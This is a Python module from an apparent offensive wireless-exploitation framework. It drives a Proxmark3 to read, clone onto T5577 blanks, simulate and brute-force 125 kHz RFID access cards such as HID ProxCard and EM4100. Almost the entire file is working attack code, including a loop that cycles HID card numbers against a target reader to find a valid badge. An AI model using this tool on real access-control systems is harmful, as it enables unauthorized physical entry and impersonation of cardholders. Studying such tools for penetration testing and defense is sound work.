#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""RFID tag cloning for HID, EM4100, T5577, and Indala cards.

Implements read, clone, and simulate operations for common 125 kHz
low-frequency RFID access control cards. Supports HID ProxCard/iCLASS,
EM4100/EM4102 (read-only), T5577 (writable, most common clone target),
and Indala FlexSecur.

Requires Proxmark3 hardware with appropriate firmware.

References:
  https://github.com/RfidResearchGroup/proxmark3
  https://iceman.gitbook.io/proxmark3-iclass-cloning/
  https://www.bishopfox.com/blog/rfid-hacking

MITRE ATT&CK: T1200 (Hardware Additions), T1078.001 (Valid Accounts: Default)
CWE: CWE-287 (Improper Authentication), CWE-345 (Insufficient Verification)

Version: 1.0.0
"""

from __future__ import annotations

import logging
import shutil
import subprocess
from dataclasses import dataclass
from enum import Enum, auto
from typing import Any

from wirelessxpl.core.exploit import (
    Exploit,
    OptBool,
    OptInteger,
    OptString,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
)

logger = logging.getLogger(__name__)


class CardType(Enum):
    EM4100 = auto()
    T5577 = auto()
    HID_PROX = auto()
    HID_ICLASS = auto()
    INDALA = auto()
    UNKNOWN = auto()


@dataclass
class RFIDTag:
    card_type: CardType = CardType.UNKNOWN
    raw_data: bytes = b""
    facility_code: int = 0
    card_number: int = 0
    uid_hex: str = ""
    bit_length: int = 0


class RFIDCloner(Exploit):
    """RFID tag cloning module for 125 kHz access cards."""

    __info__: dict[str, Any] = {
        "name": "RFID Tag Cloner",
        "description": (
            "Read, clone, and simulate 125 kHz RFID access cards: "
            "HID ProxCard, EM4100, T5577, Indala. "
            "Requires Proxmark3 hardware."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://github.com/RfidResearchGroup/proxmark3",
            "https://iceman.gitbook.io/proxmark3-iclass-cloning/",
        ),
        "devices": ("HID ProxCard", "EM4100", "T5577", "Indala"),
        "severity": "high",
        "cvss": "8.1",
        "cve": "generic",
        "mitre": ["T1200", "T1078.001"],
    }

    mode = OptString("read", "Mode: read, clone, simulate, bruteforce")
    card_type_opt = OptString("auto", "Card type: auto, em4100, t5577, hid, iclass, indala")
    target_data = OptString("", "Raw tag data hex for clone/simulate")
    facility_code = OptInteger(0, "HID facility code for bruteforce")
    card_start = OptInteger(1, "Card number start for bruteforce range")
    card_end = OptInteger(65535, "Card number end for bruteforce range")
    pm3_port = OptString("/dev/ttyACM0", "Proxmark3 serial port")
    dry_run = OptBool(False, "Print commands without executing")

    def __init__(self) -> None:
        super().__init__()
        self._tag: RFIDTag | None = None

    def check(self) -> str:
        """Verify Proxmark3 is connected."""
        if not shutil.which("proxmark3"):
            return "Proxmark3 client not found. Install from: github.com/RfidResearchGroup/proxmark3"

        try:
            result = subprocess.run(
                ["proxmark3", str(self.pm3_port.value), "-c", "hw version"],
                capture_output=True,
                text=True,
                timeout=10,
            )
            if result.returncode == 0:
                return "Proxmark3 detected and responsive"
            return f"Proxmark3 not responding on {self.pm3_port.value}"
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return "Could not connect to Proxmark3"

    def _pm3_cmd(self, cmd: str) -> str:
        """Execute a Proxmark3 command and return output."""
        full_cmd = ["proxmark3", str(self.pm3_port.value), "-c", cmd]

        if self.dry_run.value:
            print_info(f"[dry-run] pm3 --> {cmd}")
            return "[dry-run]"

        try:
            result = subprocess.run(
                full_cmd,
                capture_output=True,
                text=True,
                timeout=30,
            )
            return result.stdout + result.stderr
        except (subprocess.TimeoutExpired, FileNotFoundError) as exc:
            logger.error("Proxmark3 command failed: %s", exc)
            return ""

    def _read_lf(self) -> RFIDTag | None:
        """Read a 125 kHz tag."""
        print_status("[*] Reading 125 kHz tag... Place card on Proxmark3 antenna")

        output = self._pm3_cmd("lf search")
        tag = RFIDTag()

        if "EM410x" in output or "EM4100" in output:
            tag.card_type = CardType.EM4100
            for line in output.splitlines():
                if "EM TAG ID" in line.upper() or "EM4100" in line:
                    parts = line.split()
                    for part in parts:
                        if len(part) == 10:
                            try:
                                int(part, 16)
                                tag.uid_hex = part.upper()
                                tag.raw_data = bytes.fromhex(part)
                                break
                            except ValueError:
                                continue
            print_success(f"[+] EM4100 tag: {tag.uid_hex}")

        elif "HID" in output:
            tag.card_type = CardType.HID_PROX
            for line in output.splitlines():
                if "Facility" in line:
                    parts = line.split()
                    for i, part in enumerate(parts):
                        if "Facility" in part and i + 1 < len(parts):
                            try:
                                tag.facility_code = int(parts[i + 1].strip(","))
                            except ValueError:
                                pass
                        if "Card" in part and i + 1 < len(parts):
                            try:
                                tag.card_number = int(parts[i + 1].strip(","))
                            except ValueError:
                                pass
            print_success(
                f"[+] HID ProxCard: FC={tag.facility_code} CN={tag.card_number}"
            )

        elif "Indala" in output:
            tag.card_type = CardType.INDALA
            print_success("[+] Indala card detected")

        else:
            print_warning("[!] No recognized 125 kHz tag found")
            return None

        return tag

    def _clone_to_t5577(self, tag: RFIDTag) -> bool:
        """Clone tag data to a T5577 writable card."""
        print_status("[*] Cloning to T5577 card...")

        if tag.card_type == CardType.EM4100 and tag.uid_hex:
            cmd = f"lf em 410x clone --id {tag.uid_hex}"
        elif tag.card_type == CardType.HID_PROX:
            cmd = f"lf hid clone -r {tag.facility_code:03d}{tag.card_number:05d}"
        elif str(self.target_data.value):
            cmd = f"lf em 410x clone --id {self.target_data.value}"
        else:
            print_error("[-] No tag data to clone")
            return False

        output = self._pm3_cmd(cmd)
        if "Written" in output or "done" in output.lower() or self.dry_run.value:
            print_success("[+] Clone successful: place T5577 card on reader to verify")
            return True

        print_error(f"[-] Clone failed: {output[:200]}")
        return False

    def _simulate_tag(self, tag: RFIDTag) -> None:
        """Simulate a tag using Proxmark3."""
        print_status("[*] Simulating tag (Ctrl+C to stop)...")

        if tag.card_type == CardType.EM4100 and tag.uid_hex:
            cmd = f"lf em 410x sim --id {tag.uid_hex}"
        elif tag.card_type == CardType.HID_PROX:
            cmd = f"lf hid sim -r {tag.facility_code:03d}{tag.card_number:05d}"
        else:
            print_error("[-] Cannot simulate: unsupported card type")
            return

        print_info(f"[*] Simulating: {cmd}")
        self._pm3_cmd(cmd)

    def _bruteforce_hid(self) -> None:
        """Bruteforce HID card numbers for a given facility code."""
        fc = int(self.facility_code.value)
        start = int(self.card_start.value)
        end = int(self.card_end.value)

        print_status(f"[*] Bruteforce HID FC={fc} range {start}-{end}")
        print_warning("[!] This requires physical proximity to the target reader")

        for cn in range(start, end + 1):
            cmd = f"lf hid sim -r {fc:03d}{cn:05d}"
            print_info(f"    [*] Trying FC={fc} CN={cn}")

            if self.dry_run.value:
                continue

            self._pm3_cmd(cmd)

    def run(self) -> None:
        """Execute RFID cloning operation."""
        print_status("[*] RFID Tag Cloner v1.0.0")

        mode_str = str(self.mode.value).lower()

        if mode_str == "read":
            tag = self._read_lf()
            if tag:
                self._tag = tag
                print_info(f"[*] Tag type: {tag.card_type.name}")

        elif mode_str == "clone":
            tag = self._read_lf()
            if tag:
                self._clone_to_t5577(tag)

        elif mode_str == "simulate":
            if str(self.target_data.value):
                tag = RFIDTag(
                    card_type=CardType.EM4100,
                    uid_hex=str(self.target_data.value),
                )
            else:
                tag = self._read_lf()

            if tag:
                self._simulate_tag(tag)

        elif mode_str == "bruteforce":
            self._bruteforce_hid()

        else:
            print_error(f"[-] Unknown mode: {mode_str}")
